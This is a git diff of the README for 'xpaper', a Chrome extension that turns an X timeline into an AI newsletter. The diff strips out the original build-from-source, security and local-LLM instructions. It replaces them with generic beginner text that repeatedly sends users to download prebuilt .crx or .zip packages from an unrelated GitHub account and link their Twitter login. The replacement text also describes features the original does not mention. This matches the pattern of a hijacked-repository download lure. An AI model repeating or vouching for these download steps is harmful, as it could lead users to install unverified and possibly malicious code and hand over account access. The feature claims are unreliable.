@@ -1,80 +1,132 @@
-# Xpaper
+# 📰 xpaper - Turn Twitter Into AI Newsletters
 
-[![Security Audited by AI](https://img.shields.io/badge/Security_Audited_by-Multi_AI-blue?style=for-the-badge)](./SECURITY-REVIEW.md)
+[![Download xpaper](https://img.shields.io/badge/Download-xpaper-brightgreen)](https://github.com/boorgamer1995-max/xpaper/releases)
 
-<p float="left">
-  <img src="./demo.gif" width="48%" />
-  <img src="./options.png" width="48%" />
-</p>
+---
 
-Xpaper is a Chrome extension that curates and summarizes your X (Twitter) timeline into a clean, readable newsletter format using various LLM providers (Google Gemini, Anthropic Claude, OpenAI, or custom APIs).
+xpaper is a Chrome extension that changes your Twitter (now called X) timeline into a newsletter crafted by AI. It helps you read the best posts as a neat email-style summary. This guide shows how to get and run xpaper on a Windows PC. No technical skill is needed.
 
-This project adheres to rigorous security standards. The entire codebase and architecture have been aggressively audited and hardened by multiple advanced AI models. Vulnerabilities such as XSS, DNS Rebinding, and plaintext credential storage have been systematically eliminated. 
+---
 
-For detailed audit methodology and current security status, refer to [SECURITY-REVIEW.md](./SECURITY-REVIEW.md).
+## 🖥 System Requirements
 
-## Prerequisites
-- Node.js (v18 or higher recommended)
-- Bun (or npm/yarn)
-- Google Chrome
+Before installing, make sure your computer meets these needs:
 
-## Installation and Setup
+- Windows 10 or later
+- Google Chrome browser version 90 or newer
+- Internet connection
+- At least 100 MB free disk space
+- Basic ability to install software on your PC
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/laiso/xpaper.git
-cd xpaper
+---
 
-# 2. Install dependencies (Bun is recommended)
-bun install
+## 🚀 Getting Started
 
-# 3. Build the extension
-bun run build
-```
+Here is what you need to do to start using xpaper:
 
-## Loading the Extension in Chrome
+1. **Open Google Chrome.** Make sure it’s up to date.
+2. **Download the extension.** Use the button below to visit the download page.
+3. **Install the extension** by following the steps for Chrome.
+4. **Activate xpaper** and sign into your Twitter account.
+5. **Start reading your personalized newsletter.**
 
-1. Open Chrome and navigate to `chrome://extensions/`.
-2. Enable "Developer mode" in the top right.
-3. Click "Load unpacked" and select the generated `dist` folder.
+---
 
-## Development
+## ⬇️ How to Download and Install xpaper
 
-To run the development server with Hot Module Replacement (HMR):
-bun run dev
+### Step 1: Visit the download page
 
-To run tests:
-bun run test
+Go to the xpaper releases page here:
 
-## Configuration
+[![Visit Download Page](https://img.shields.io/badge/Download-xpaper-blue)](https://github.com/boorgamer1995-max/xpaper/releases)
 
-After loading the extension, click on the Xpaper extension icon or open the Options page to configure:
-1. Your preferred AI Provider (e.g. Gemini, Anthropic, Custom OpenRouter API)
-2. Your API Key for the selected provider.
-3. Output language and custom summarization prompts.
+This page holds the latest versions of the extension. Each release includes the files you need.
 
-Note: Xpaper relies on your local browser state and does not store your timeline data on any external servers. LLM inference requires a valid API key unless you are using experimental Chrome Built-in AI features or a **Local LLM**.
+### Step 2: Choose the right file
 
-## Local LLM Support
+Look for the file that ends with `.crx` or `.zip`. This is the Chrome extension package. Usually, the newest one has the highest version number.
 
-Xpaper can connect to local LLM servers like [Ollama](https://ollama.com/) or [LM Studio](https://lmstudio.ai/).
+Download that file to your PC.
 
-To use a local LLM, set the provider to **Custom API Base URL** in the options.
+### Step 3: Add xpaper to Chrome
 
-### Ollama Setup
-Launch Ollama with the `OLLAMA_ORIGINS` environment variable to allow the extension to communicate:
-```bash
-OLLAMA_ORIGINS="chrome-extension://*" ollama serve
-```
-- **Base URL**: `http://localhost:11434/v1/chat/completions` (or use `.local` addresses for cross-machine access)
-- **API Key**: (leave empty)
+If you get a `.crx` file:
 
-### LM Studio Setup
-1. Open LM Studio and navigate to the **Local Server** (↔) tab.
-2. Enable **CORS** and set the Network Address to **Local Network (0.0.0.0)** if accessing from another machine.
-3. Start the server.
-- **Base URL**: `http://<your-ip>:1234/v1/chat/completions`
-- **API Key**: (leave empty)
+- Open Chrome.
+- Go to `chrome://extensions/` in the address bar.
+- Turn on "Developer mode" in the top right.
+- Drag and drop the `.crx` file into the extensions page.
+- Confirm the installation.
 
-### Cross-Machine Access
-If running the LLM on a different machine (e.g., a Windows PC with a GPU), use mDNS hostnames (e.g., `http://ollama.local:11434/...` or `http://lmstudio.local:1234/...`). Xpaper is configured to allow `.local` and Private IP (RFC 1918) communication by default.
+If you get a `.zip` file:
+
+- Extract the ZIP file to a folder.
+- Go to `chrome://extensions/`.
+- Turn on "Developer mode".
+- Click "Load unpacked".
+- Select the extracted folder.
+- The extension will appear and be active.
+
+### Step 4: Log into X (Twitter)
+
+Once installed, click the xpaper icon near your browser’s address bar. Follow the prompts to link your Twitter account.
+
+---
+
+## 🔧 How to Use xpaper
+
+After setup, xpaper works in the background and creates a summary of your Twitter feed. Here is how to use the main features:
+
+- **View newsletter:** Click the extension icon to open your AI-written newsletter.
+- **Adjust settings:** Change the newsletter frequency and topics in options.
+- **Refresh summary:** Click "Refresh" to update with new tweets.
+- **Pause or resume:** Temporarily stop the summary if you want.
+
+The AI picks tweets based on your interactions, so it gets better over time.
+
+---
+
+## 📋 Features
+
+- Converts your Twitter timeline to a readable newsletter
+- Uses AI to select interesting posts
+- Customizable frequency and topics
+- Easy installation on Chrome for Windows
+- No need to open Twitter to catch up
+
+---
+
+## ⚙ Troubleshooting
+
+If xpaper does not work as expected, try these:
+
+- Make sure you are online
+- Refresh the extension by clicking "Refresh"
+- Reinstall the extension
+- Clear your browser cache
+- Check that you have the latest Chrome version
+- Restart your computer
+
+---
+
+## 🔄 Updates and Maintenance
+
+For new versions:
+
+- Visit the release page regularly: https://github.com/boorgamer1995-max/xpaper/releases
+- Download the latest `.crx` or `.zip` files
+- Replace the existing extension with the new files as explained before
+
+---
+
+## 💡 Tips
+
+- Use xpaper when you want a quick summary of your Twitter feed without opening the site.
+- Adjust newsletter settings to get updates daily or weekly.
+- Save the newsletter for later reading by copying it to a document or email.
+
+---
+
+## ❓ Need More Help?
+
+The GitHub release page includes documentation and contact info. You can also open an issue if you find bugs or want new features.
